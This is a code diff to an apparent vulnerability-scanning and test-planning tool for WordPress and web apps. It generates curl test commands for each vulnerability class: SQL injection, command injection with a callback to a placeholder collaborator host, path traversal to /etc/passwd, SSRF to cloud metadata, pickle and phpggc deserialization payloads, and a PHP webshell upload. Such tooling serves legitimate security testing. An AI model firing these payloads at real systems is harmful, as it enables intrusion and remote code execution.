@@ -541,6 +541,7 @@ class SecurityFinding:
     evidence:    List[str]
     confidence:  float       # 0.0 – 1.0
     location:    str = ""    # file:line or endpoint
+    route:       str = ""    # HTTP route path when vuln is a registered endpoint
 
 
 class VulnerabilityIntelligence:
@@ -747,16 +748,74 @@ class VulnerabilityIntelligence:
                             location=rel,
                         ))
 
-                # Mode 2: public endpoints
+                # Mode 2: public endpoints — extract REST route or AJAX action
+                # Pattern A: register_rest_route('ns/v1', '/path', [...])  — both strings
+                _rr_literal = re.compile(
+                    r"register_rest_route\s*\(\s*['\"]([^'\"]+)['\"]\s*,"
+                    r"\s*['\"]([^'\"]{1,80})['\"]",
+                    re.I,
+                )
+                # Pattern B: register_rest_route( $var, '/path', [...])  — variable ns + string path
+                _rr_varns = re.compile(
+                    r"register_rest_route\s*\(\s*\$[A-Za-z_>:\-]+\s*,"
+                    r"\s*['\"]([^'\"]{1,80})['\"]",
+                    re.I,
+                )
+                # Pattern C: wp_ajax_nopriv_<action_name>  — public AJAX handler
+                _ajax_public = re.compile(
+                    r"add_action\s*\(\s*['\"]wp_ajax_nopriv_([A-Za-z0-9_]+)['\"]",
+                    re.I,
+                )
+                # Namespace hints: $this->namespace = 'ns/v1' or define('NS', 'ns/v1')
+                _ns_re = re.compile(
+                    r"(?:namespace\s*=\s*['\"]([^'\"]{3,40})['\"]"
+                    r"|define\s*\(\s*['\"][A-Z_]+['\"],\s*['\"]([A-Za-z0-9_/-]{3,30})['\"])",
+                    re.I,
+                )
                 for pat, vuln_class in self._PUBLIC_ENDPOINT_PATTERNS:
                     for m in re.finditer(pat, content, re.I | re.DOTALL):
                         snippet = content[m.start(): m.start() + 120].replace("\n", " ")
+                        # Search window: 1.5 kB before + 50 chars after the match
+                        win = content[max(0, m.start() - 1500): m.start() + 50]
+                        route_str = ""
+
+                        # Try literal namespace + path first
+                        for rm in _rr_literal.finditer(win):
+                            ns = rm.group(1).strip("/")
+                            path = rm.group(2).strip("/")
+                            route_str = f"/wp-json/{ns}/{path}"
+
+                        # Try variable namespace + string path
+                        if not route_str:
+                            for rm in _rr_varns.finditer(win):
+                                raw_path = rm.group(1).lstrip("/")
+                                # Try to find a namespace hint in the same window
+                                ns = ""
+                                for nm in _ns_re.finditer(win):
+                                    ns = (nm.group(1) or nm.group(2) or "").strip("/")
+                                    break
+                                if ns:
+                                    route_str = f"/wp-json/{ns}/{raw_path}"
+                                else:
+                                    route_str = f"/wp-json/<ns>/{raw_path}"
+
+                        # Try AJAX action — different mechanism from REST
+                        if not route_str:
+                            for am in _ajax_public.finditer(win):
+                                action = am.group(1)
+                                route_str = f"/wp-admin/admin-ajax.php?action={action}"
+                                break
+
                         findings.append(SecurityFinding(
                             vuln_class=vuln_class,
                             description="Endpoint registered with no authentication requirement",
-                            evidence=[f"{rel}: `{snippet}`"],
+                            evidence=[
+                                f"{rel}: `{snippet}`",
+                                *([ f"route: {route_str}" ] if route_str else []),
+                            ],
                             confidence=0.72,
                             location=rel,
+                            route=route_str,
                         ))
 
                 # Mode 3: sinks without mitigation
@@ -1097,6 +1156,30 @@ class RemediationEngine:
 # ─────────────────────── 4. CVE Intelligence ──────────────────────────────────
 
 @dataclass
+class TestStep:
+    """One concrete step in a test strategy, with a runnable curl command."""
+    order:    int
+    action:   str            # human-readable description
+    curl:     str = ""       # runnable curl / CLI command (may contain <placeholders>)
+    expected: str = ""       # what a successful hit looks like
+
+
+@dataclass
+class FullAnalysisResult:
+    """
+    Unified output of UniversalEngine.full_analysis():
+    scan findings + enriched CVE profiles + test strategies + dependency vulnerabilities.
+    """
+    source_dir:      str
+    findings:        List["SecurityFinding"]   = field(default_factory=list)
+    cve_profiles:    List["CveProfile"]        = field(default_factory=list)
+    test_strategies: Dict[str, List["TestStep"]] = field(default_factory=dict)
+    dep_report:      Optional["DependencyReport"] = None
+    vuln_deps:       List[dict]                = field(default_factory=list)
+    summary:         str                       = ""
+
+
+@dataclass
 class CveProfile:
     """Structured reasoning extracted from a CVE description — no NVD fields verbatim."""
     cve_id:         str
@@ -1268,93 +1351,405 @@ class CveIntelligence:
         except Exception:
             return None
 
-    def suggest_test_strategy(self, profile: "CveProfile") -> List[str]:
-        """Given a CveProfile, return an ordered list of concrete test steps."""
+    def suggest_test_strategy(
+        self,
+        profile: "CveProfile",
+        base_url: str = "http://TARGET",
+    ) -> List["TestStep"]:
+        """
+        Given a CveProfile, return an ordered list of TestStep objects each with:
+          - action: human-readable description
+          - curl: a runnable curl command (placeholder base_url if not provided)
+          - expected: what a successful hit looks like
+          - order: execution sequence number
+
+        Call enrich_profile_from_scan() first to get real endpoint_hint values.
+        """
         ep = profile.endpoint_hint or "<endpoint>"
-        steps: List[str] = []
+        # Normalise base_url — strip trailing slash
+        base = base_url.rstrip("/")
+        full_ep = f"{base}{ep}" if ep.startswith("/") else ep
+
+        steps: List["TestStep"] = []
+        seq = [0]
+
+        def step(action: str, curl: str = "", expected: str = "") -> None:
+            seq[0] += 1
+            steps.append(TestStep(
+                order=seq[0],
+                action=action,
+                curl=curl,
+                expected=expected,
+            ))
 
         if not profile.auth_required:
-            steps.append("UNAUTHENTICATED — send all test requests without session cookies or auth headers")
+            step(
+                "UNAUTHENTICATED — send all test requests without session cookies or auth headers",
+                curl=f"curl -si '{full_ep}' -H 'Cookie:' | head -5",
+                expected="HTTP 200 or error without redirecting to login",
+            )
 
         vc = profile.vuln_class
+
         if vc == "auth_bypass":
-            steps += [
+            step(
                 f"POST {ep} with minimal/dummy params (login_type, identifier, etc.)",
-                "Inspect EVERY response (even 4xx) for Set-Cookie headers with auth tokens",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-H 'Content-Type: application/json' "
+                      f"-d '{{\"login_type\":\"google\",\"password\":\"dummy\"}}' | head -20"),
+                expected="HTTP 200/403 body + Set-Cookie in response headers",
+            )
+            step(
+                "Inspect EVERY response (even 4xx) for Set-Cookie with auth tokens",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-d '{{\"login_type\":\"google\",\"password\":\"dummy\"}}' "
+                      f"| grep -i set-cookie"),
+                expected="wordpress_logged_in_* or similar cookie",
+            )
+            step(
                 "If auth cookie received: GET /wp-admin/profile.php to confirm session",
-                "Document: request → 403/200 body + cookies → profile page access",
-            ]
+                curl=(f"curl -si '{base}/wp-admin/profile.php' "
+                      f"-H 'Cookie: <captured_cookie>' | grep -i 'profile\\|admin'"),
+                expected="Profile page loads (200), not a redirect to /wp-login.php",
+            )
+            step(
+                "Document: request → response body + cookies → /wp-admin/profile.php access",
+                expected="Screenshot or response diff showing authenticated access",
+            )
+
         elif vc == "sqli":
-            steps += [
-                f"Test {ep} with param value: ' OR '1'='1 (quote injection)",
-                "Test with time-based blind: ' AND SLEEP(5)-- (MySQL) / ' AND pg_sleep(5)-- (Postgres)",
-                "Watch response time delta to confirm blind injection",
-                "Confirm with UNION-based if error messages visible: ' UNION SELECT 1,2,3--",
-            ]
+            step(
+                f"Test {ep} with quote injection: ' OR '1'='1",
+                curl=(f"curl -si '{full_ep}' "
+                      f"-G --data-urlencode \"search=' OR '1'='1\" | head -20"),
+                expected="SQL error message OR unexpected data in response",
+            )
+            step(
+                "Time-based blind: ' AND SLEEP(5)-- (MySQL) / ' AND pg_sleep(5)-- (Postgres)",
+                curl=(f"curl -si -w '\\ntime_total: %{{time_total}}\\n' '{full_ep}' "
+                      f"-G --data-urlencode \"search=' AND SLEEP(5)--\""),
+                expected="Response time >= 5 seconds confirms MySQL blind injection",
+            )
+            step(
+                "UNION-based if errors visible: ' UNION SELECT NULL,version(),NULL--",
+                curl=(f"curl -si '{full_ep}' "
+                      f"-G --data-urlencode \"search=' UNION SELECT NULL,version(),NULL--\" "
+                      f"| grep -Eo '[0-9]+\\.[0-9]+\\.[0-9]+-'"),
+                expected="MySQL/Postgres version string in response body",
+            )
+            step(
+                "sqlmap confirmation (do NOT run on production): sqlmap -u '<url>' --batch --level=2",
+                curl=f"sqlmap -u '{full_ep}?search=1' --batch --level=2 --dbms=mysql",
+                expected="sqlmap reports 'parameter is vulnerable'",
+            )
+
         elif vc == "rce":
-            steps += [
-                f"Test {ep} with PHP command injection: ;id; / $(id) / `id`",
-                "Try SSTI if template engine suspected: {{7*7}} → 49",
-                "For deserialization: generate a gadget chain for the detected language/framework",
-                "Confirm RCE with a time-based proof: sleep(5) or ping to collaborator",
-            ]
+            step(
+                f"Test {ep} with time-based OS command injection: ;sleep(5);",
+                curl=(f"curl -si -w '\\ntime: %{{time_total}}\\n' -X POST '{full_ep}' "
+                      f"-d 'cmd=;sleep+5;' | tail -3"),
+                expected="Response delayed by ~5 seconds",
+            )
+            step(
+                "Try SSTI if template engine suspected: {{7*7}} or ${{7*7}}",
+                curl=(f"curl -si '{full_ep}' "
+                      f"-G --data-urlencode \"q={{{{7*7}}}}\" | grep '49'"),
+                expected="'49' in response body",
+            )
+            step(
+                "Command injection via input field: $(id) or `id`",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-d 'name=$(id)' | grep 'uid='"),
+                expected="uid=33(www-data) or similar in response",
+            )
+            step(
+                "Out-of-band confirmation: curl to interactsh/Burp Collaborator",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-d 'name=$(curl+http://YOUR_COLLABORATOR_HOST/ping)'"),
+                expected="HTTP request received at collaborator",
+            )
+
         elif vc == "path_traversal":
-            steps += [
+            step(
                 f"Test {ep} with: ../../../../etc/passwd",
-                "Try URL-encoded: ..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-                "Try double-encoding: ..%252F",
-                "On Windows: ..\\..\\..\\windows\\win.ini",
-                "Confirm with /etc/hostname or /proc/version (shorter, less flagged)",
-            ]
+                curl=(f"curl -si '{full_ep}' "
+                      f"-G --data-urlencode 'file=../../../../etc/passwd' | grep 'root:'"),
+                expected="root:x:0:0 in response — confirms LFI",
+            )
+            step(
+                "URL-encoded traversal: ..%2F..%2F..%2Fetc%2Fpasswd",
+                curl=(f"curl -si '{full_ep}?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd' | grep root"),
+                expected="root: in body",
+            )
+            step(
+                "Double-encoding: ..%252F..%252F (bypasses single-decode filters)",
+                curl=(f"curl -si '{full_ep}?file=..%252F..%252F..%252Fetc%252Fpasswd' | grep root"),
+                expected="root: in body",
+            )
+            step(
+                "Confirm with /proc/version or /etc/hostname (less flagged than /etc/passwd)",
+                curl=(f"curl -si '{full_ep}' "
+                      f"-G --data-urlencode 'file=../../../../proc/version' | grep -i linux"),
+                expected="Linux kernel version string",
+            )
+
         elif vc in ("idor", "broken_access_control"):
-            steps += [
-                "Create two accounts (attacker + victim)",
-                "Identify victim's resource ID from their account",
-                "Access/modify victim's resource using attacker's session but victim's ID",
-                "Confirm: attacker can read/modify data belonging to victim",
-            ]
+            step(
+                "Enumerate accessible objects as user A (the attacker)",
+                curl=(f"curl -si '{full_ep}' "
+                      f"-H 'Cookie: <attacker_session>' | jq '.[] | .id'"),
+                expected="List of IDs owned by attacker",
+            )
+            step(
+                "Access user B's resource using attacker session but victim's ID",
+                curl=(f"curl -si '{full_ep}/<victim_id>' "
+                      f"-H 'Cookie: <attacker_session>'"),
+                expected="HTTP 200 with victim's data (not 403/404)",
+            )
+            step(
+                "Modify victim's resource to prove write access",
+                curl=(f"curl -si -X PUT '{full_ep}/<victim_id>' "
+                      f"-H 'Cookie: <attacker_session>' "
+                      f"-d '{{\"field\":\"pwned_by_attacker\"}}' | head -5"),
+                expected="HTTP 200 confirming modification",
+            )
+
         elif vc == "xss":
-            steps += [
-                f"Test {ep} with: <script>alert(1)</script>",
-                "Try: <img src=x onerror=alert(1)>",
-                "For stored XSS: inject and then view the stored value in another browser session",
-                "Confirm execution context (reflected/stored/DOM) before reporting",
-            ]
+            step(
+                f"Test {ep} with reflected payload: <script>alert(1)</script>",
+                curl=(f"curl -si '{full_ep}' "
+                      f"-G --data-urlencode \"q=<script>alert(1)</script>\" | grep script"),
+                expected="Payload reflected unescaped in response body",
+            )
+            step(
+                "Try event-handler bypass: <img src=x onerror=alert(1)>",
+                curl=(f"curl -si '{full_ep}' "
+                      f"-G --data-urlencode \"q=<img src=x onerror=alert(1)>\" | grep onerror"),
+                expected="onerror= attribute in unescaped form in response",
+            )
+            step(
+                "For stored XSS: submit payload, then view it in a separate session",
+                expected="Payload executes in second browser session (use Burp's render)",
+            )
+            step(
+                "Confirm context: reflected / stored / DOM (determines severity)",
+                expected="Screenshot of alert(1) execution or Burp Collaborator interaction",
+            )
+
         elif vc == "ssrf":
-            steps += [
-                f"Test {ep} with URL param pointing to internal: http://169.254.169.254/latest/meta-data/",
-                "Also try: http://localhost:80/, http://127.0.0.1:22/",
-                "Use a Burp Collaborator/interactsh callback URL to confirm out-of-band",
-                "Check response body for internal service data (AWS metadata, etc.)",
-            ]
+            step(
+                f"Test {ep} with internal metadata URL: http://169.254.169.254/",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-d 'url=http://169.254.169.254/latest/meta-data/' | head -20"),
+                expected="AWS/GCP/Azure metadata keys in response",
+            )
+            step(
+                "Try localhost internal services: http://127.0.0.1:22/ and :6379/ (Redis)",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-d 'url=http://127.0.0.1:6379/' | head -5"),
+                expected="Redis banner or connection refused (confirms port scan)",
+            )
+            step(
+                "Out-of-band via Burp Collaborator / interactsh",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-d 'url=http://YOUR_COLLABORATOR_HOST/'"),
+                expected="DNS + HTTP request at collaborator confirms blind SSRF",
+            )
+
         elif vc == "deserialization":
-            steps += [
-                f"Test {ep} by submitting a crafted serialized payload",
-                "PHP: use phpggc to generate a gadget chain: phpggc <framework> RCE/CMD id",
-                "Python: craft pickle payload: pickle.dumps({'__reduce__': ...})",
-                "Java: use ysoserial to generate payload for detected library versions",
-                "Confirm with DNS callback or time-based delay",
-            ]
+            step(
+                f"Test {ep} with PHP gadget chain (phpggc)",
+                curl=(f"phpggc -o /tmp/payload.txt <Framework> RCE/CMD 'id' && "
+                      f"curl -si '{full_ep}' "
+                      f"-H 'Cookie: data=$(base64 -w0 /tmp/payload.txt)' | grep uid"),
+                expected="uid=33(www-data) in response body",
+            )
+            step(
+                "Python: test pickle deserialization vector",
+                curl=(f"python3 -c \""
+                      f"import pickle,base64,os; "
+                      f"class E: __reduce__=lambda s: (os.system,('id',)); "
+                      f"print(base64.b64encode(pickle.dumps(E())).decode())\" | "
+                      f"xargs -I% curl -si '{full_ep}' -d 'data=%'"),
+                expected="uid= output in server logs or response",
+            )
+            step(
+                "Confirm with time-based: use sleep(5) as the command",
+                expected="Response delayed by 5 seconds confirms RCE via deserialization",
+            )
+
         elif vc == "file_upload":
-            steps += [
-                f"POST {ep} with a file named shell.php containing <?php system($_GET['cmd']);?>",
-                "Try bypasses: shell.php.jpg, shell.pHp, shell.php%00.jpg",
-                "Try MIME type spoofing: change Content-Type to image/jpeg",
-                "After upload: find the file URL and access it to confirm execution",
-            ]
+            step(
+                f"POST {ep} with a PHP webshell: shell.php",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-F 'file=@/dev/stdin;filename=shell.php;type=application/octet-stream' "
+                      f"<<< '<?php system($_GET[\"cmd\"]);?>' | head -10"),
+                expected="HTTP 200 with upload confirmation and file URL",
+            )
+            step(
+                "Try extension bypasses: shell.php.jpg, shell.pHp, shell.php%00.jpg",
+                curl=(f"curl -si -X POST '{full_ep}' "
+                      f"-F 'file=@shell.php;filename=shell.php.jpg'"),
+                expected="Upload accepted; then access shell.php.jpg?cmd=id",
+            )
+            step(
+                "After upload: find the file URL and confirm execution",
+                curl=(f"curl -si '{base}/uploads/shell.php?cmd=id' | grep uid"),
+                expected="uid=33(www-data) confirms webshell execution",
+            )
+
         else:
-            steps += [
+            step(
                 f"Test {ep} with malformed/boundary input for each parameter",
+                curl=f"curl -si '{full_ep}?param=' | head -20",
+                expected="Unexpected error message or data disclosure",
+            )
+            step(
                 "Compare authenticated vs unauthenticated responses",
+                curl=(f"curl -si '{full_ep}' && "
+                      f"curl -si '{full_ep}' -H 'Cookie: <valid_session>'"),
+                expected="Different response bodies or status codes",
+            )
+            step(
                 "Watch for information disclosure in error responses",
-            ]
+                expected="Stack traces, file paths, SQL errors, internal hostnames",
+            )
 
         if profile.version_hint:
-            steps.append(f"NOTE — confirm target version is <= {profile.version_hint} before testing")
+            step(
+                f"NOTE — confirm target version is <= {profile.version_hint} before testing",
+                curl=(f"curl -si '{base}/wp-login.php' | grep -i 'ver=' || "
+                      f"curl -si '{base}/readme.html' | grep -i 'version'"),
+                expected=f"Version string <= {profile.version_hint}",
+            )
         if profile.affected_component:
-            steps.append(f"NOTE — verify {profile.affected_component} is installed/active")
+            step(
+                f"NOTE — verify {profile.affected_component} is installed/active",
+                curl=(f"curl -si '{base}/wp-json/wp/v2/plugins' "
+                      f"-H 'Authorization: Basic <admin_b64>' | jq '.[] | .plugin'"),
+                expected=f"{profile.affected_component} in active plugins list",
+            )
 
         return steps
+
+    def enrich_profile_from_scan(
+        self,
+        profile: "CveProfile",
+        findings: List["SecurityFinding"],
+        source_dir: str = "",
+    ) -> "CveProfile":
+        """
+        Cross-reference a CveProfile against live scan findings:
+        — Fill endpoint_hint from REST routes found in source when description had none
+        — Upgrade vuln_class from 'unknown' to a specific class when scan found matching sinks
+        — Set auth_required=False when scan found public endpoints with no auth callback
+        — Raise confidence when scan evidence corroborates the CVE description
+
+        This is the glue between static analysis (VulnerabilityIntelligence) and
+        CVE reasoning (CveIntelligence): call it after scan_for_vulnerabilities() to
+        get a richer profile that suggest_test_strategy() can use with real endpoints.
+        """
+        import dataclasses as _dc
+
+        # Map scan vuln_class → CVE vuln_class
+        _scan_to_cve = {
+            "sqli_string_concat_php": "sqli",
+            "sqli_f_string_python": "sqli",
+            "xss_echo_php": "xss",
+            "xss_dom_innerHTML": "xss",
+            "cmdi_php": "rce",
+            "cmdi_python": "rce",
+            "path_traversal": "path_traversal",
+            "deserialization_php_user_input": "deserialization",
+            "deserialization_python": "deserialization",
+            "ssrf": "ssrf",
+            "file_upload": "file_upload",
+            "weak_crypto": "unknown",
+            "hardcoded_credential": "unknown",
+            "hardcoded_api_key": "unknown",
+            "wp_rest_no_auth_required": "broken_access_control",
+        }
+
+        changes: Dict[str, Any] = {}
+
+        # 1. Upgrade vuln_class from 'unknown' using scan evidence
+        if profile.vuln_class == "unknown":
+            for f in findings:
+                mapped = _scan_to_cve.get(f.vuln_class)
+                if mapped and mapped != "unknown":
+                    changes["vuln_class"] = mapped
+                    changes["confidence"] = max(profile.confidence, f.confidence * 0.8)
+                    break
+
+        # 2. Fill endpoint_hint from scan findings when profile has none.
+        # Only use a wp_rest finding route when the profile's own vuln_class is access-control
+        # related — not for injection CVEs whose actual endpoint is a different mechanism (e.g. AJAX).
+        _access_control_classes = {
+            "broken_access_control", "idor", "privilege_escalation", "unknown",
+        }
+        profile_vc = (changes.get("vuln_class") or profile.vuln_class or "").lower()
+        endpoint_class_match = any(c in profile_vc for c in ("access", "idor", "auth", "unknown"))
+
+        if not profile.endpoint_hint:
+            if endpoint_class_match:
+                # wp_rest findings now carry a .route field extracted from register_rest_route()
+                for f in findings:
+                    if "wp_rest" in f.vuln_class and f.route and "<ns>" not in f.route:
+                        changes["endpoint_hint"] = f.route
+                        break
+                # Accept <ns> placeholder routes only if nothing better is available
+                if "endpoint_hint" not in changes:
+                    for f in findings:
+                        if "wp_rest" in f.vuln_class and f.route:
+                            changes["endpoint_hint"] = f.route
+                            break
+                # Fallback: check evidence strings for /wp-json/... patterns
+                if "endpoint_hint" not in changes:
+                    _route_re = re.compile(r"/wp-json/[A-Za-z0-9_/-]{5,60}")
+                    for f in findings:
+                        if "wp_rest" in f.vuln_class:
+                            for ev in (f.evidence or []):
+                                m = _route_re.search(str(ev))
+                                if m:
+                                    changes["endpoint_hint"] = m.group(0)
+                                    break
+                        if "endpoint_hint" in changes:
+                            break
+
+            # Fallback: check the location field — only use it if it IS a URL path
+            # (starts with /, no file extension in the last segment).
+            if "endpoint_hint" not in changes:
+                sinks = [f for f in findings if f.vuln_class not in
+                         ("hardcoded_credential", "hardcoded_api_key", "embedded_private_key")]
+                for sf in sorted(sinks, key=lambda f: -f.confidence):
+                    loc = (sf.location or "").split(":")[0]
+                    last_seg = loc.rstrip("/").split("/")[-1]
+                    is_url_path = (loc.startswith("/")
+                                   and "." not in last_seg
+                                   and not loc.endswith(".php")
+                                   and not loc.endswith(".py"))
+                    if is_url_path:
+                        changes["endpoint_hint"] = loc
+                        break
+                # If still nothing, leave endpoint_hint empty — a file path is not an endpoint
+
+        # 3. If scan found no-auth REST endpoints and profile says auth_required,
+        #    lower the bar (the evidence says unauthenticated is possible)
+        no_auth_findings = [f for f in findings if f.vuln_class == "wp_rest_no_auth_required"]
+        if no_auth_findings and profile.auth_required:
+            changes["auth_required"] = False
+
+        # 4. Boost confidence when scan corroborates CVE vuln class
+        same_class = [f for f in findings
+                      if _scan_to_cve.get(f.vuln_class) == profile.vuln_class]
+        if same_class and profile.confidence < 0.9:
+            boost = min(0.15, 0.05 * len(same_class))
+            changes["confidence"] = round(
+                min(0.95, changes.get("confidence", profile.confidence) + boost), 2)
+
+        if changes:
+            return _dc.replace(profile, **changes)
+        return profile
 
 
 # ─────────────────────── 5. Dependency Analysis ───────────────────────────────
@@ -1721,3 +2116,95 @@ class UniversalEngine:
         Covers npm, pip, composer, maven, bundler, cargo, go modules.
         """
         return self.dep_analysis.analyze(source_dir, max_depth=max_depth)
+
+    def full_analysis(
+        self,
+        source_dir: str,
+        cve_ids: Optional[List[str]] = None,
+        base_url: str = "http://TARGET",
+        max_scan_files: int = 500,
+    ) -> FullAnalysisResult:
+        """
+        Full integrated analysis — the main entry point that connects all five capabilities:
+
+        1. Scan source code for vulnerabilities (VulnerabilityIntelligence)
+        2. Build / fetch CVE profiles from NVD (CveIntelligence)
+        3. Enrich each CVE profile using scan findings (endpoint_hint, auth_required, confidence)
+        4. Generate actionable test strategies with real curl commands per profile
+        5. Analyze dependencies and flag known-vulnerable packages (DependencyAnalysis)
+        6. Return a FullAnalysisResult combining all five outputs
+
+        Args:
+            source_dir:   Path to the source tree to analyze.
+            cve_ids:      Optional list of CVE IDs to reason about alongside the scan.
+            base_url:     Base URL for generating curl commands in test strategies.
+            max_scan_files: Max files to scan (passed to scan_for_vulnerabilities).
+
+        Returns:
+            FullAnalysisResult with .findings, .cve_profiles, .test_strategies,
+            .dep_report, .vuln_deps, and a .summary string.
+        """
+        result = FullAnalysisResult(source_dir=source_dir)
+
+        # ── 1. Static security scan ──────────────────────────────────────────────
+        result.findings = self.vuln_intel.scan_for_vulnerabilities(
+            source_dir, max_files=max_scan_files
+        )
+
+        # ── 2. Dependency inventory + known-vulnerable flagging ──────────────────
+        result.dep_report = self.dep_analysis.analyze(source_dir)
+        result.vuln_deps  = self.dep_analysis.flag_known_vulnerable(result.dep_report)
+
+        # ── 3. CVE profiles — fetch from NVD, fall back to description reasoning ─
+        cve_ids = cve_ids or []
+        for cid in cve_ids:
+            profile = self.cve_intel.profile_from_nvd(cid.upper().strip())
+            if profile is None:
+                profile = self.cve_intel.profile_from_description(cid)
+            if profile:
+                result.cve_profiles.append(profile)
+
+        # If no CVE IDs given but scan found findings, synthesise a profile from them
+        if not result.cve_profiles and result.findings:
+            top = max(result.findings, key=lambda f: f.confidence)
+            synth = self.cve_intel.profile_from_description(
+                f"{top.vuln_class} vulnerability found in {top.location}"
+            )
+            result.cve_profiles.append(synth)
+
+        # ── 4. Enrich each profile with scan evidence + generate test strategy ───
+        enriched_profiles: List[CveProfile] = []
+        for profile in result.cve_profiles:
+            ep = self.cve_intel.enrich_profile_from_scan(
+                profile, result.findings, source_dir
+            )
+            enriched_profiles.append(ep)
+            result.test_strategies[ep.cve_id] = self.cve_intel.suggest_test_strategy(
+                ep, base_url=base_url
+            )
+        result.cve_profiles = enriched_profiles
+
+        # ── 5. Human-readable summary ────────────────────────────────────────────
+        n_findings = len(result.findings)
+        n_vuln_deps = len(result.vuln_deps)
+        n_cves = len(result.cve_profiles)
+        n_steps = sum(len(v) for v in result.test_strategies.values())
+
+        lines = [
+            f"=== Full Analysis: {os.path.basename(source_dir)} ===",
+            f"  Scan findings:        {n_findings}",
+            f"  Vulnerable deps:      {n_vuln_deps}",
+            f"  CVE profiles built:   {n_cves}",
+            f"  Test strategy steps:  {n_steps}",
+        ]
+        if result.findings:
+            from collections import Counter
+            top_classes = Counter(f.vuln_class for f in result.findings).most_common(3)
+            lines.append("  Top finding classes:  " + ", ".join(
+                f"{cls}({n})" for cls, n in top_classes))
+        if result.vuln_deps:
+            lines.append("  Vulnerable packages:  " + ", ".join(
+                d.get("package", "?") for d in result.vuln_deps[:5]))
+        result.summary = "\n".join(lines)
+
+        return result
